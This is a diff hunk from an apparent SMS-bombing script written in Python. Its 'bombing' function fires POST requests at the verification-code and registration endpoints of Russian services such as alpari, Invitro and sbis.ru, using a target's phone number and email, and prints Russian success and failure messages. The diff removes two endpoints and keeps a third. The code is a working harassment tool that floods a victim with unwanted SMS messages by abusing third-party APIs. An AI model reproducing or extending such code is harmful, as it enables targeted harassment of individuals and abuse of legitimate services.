@@ -178,18 +178,6 @@ def bombing():
         print('[-] Не отправлено!')
 
     try:
-        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': email, 'mobilephone': phone, 'deliveryOption': 'sms'})
-        print('[+] alpari отправлено!')
-    except:
-        print('[-] Не отправлено!')
-
-    try:
-        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
-        print('[+] Invitro отправлено!')
-    except:
-        print('[-] Не отправлено!')
-
-    try:
         requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'})
         print('[+] Sberbank отправлено!')
     except:
